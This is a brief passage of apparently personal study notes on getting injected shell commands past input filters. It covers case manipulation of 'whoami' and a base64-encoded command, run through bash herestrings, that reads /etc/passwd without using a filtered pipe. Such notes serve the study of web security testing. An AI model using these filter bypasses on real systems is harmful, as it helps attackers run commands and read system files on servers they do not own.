basewe can use case manipulation to obfuscate our command: 

whoami -> wHoAMi

-----
## Encoded Commands

we can encode our commands and use a bash decoding command to execute them: 

```shell-session
echo -n 'cat /etc/passwd | grep 33' | base64
```

```shell-session
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

`` Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

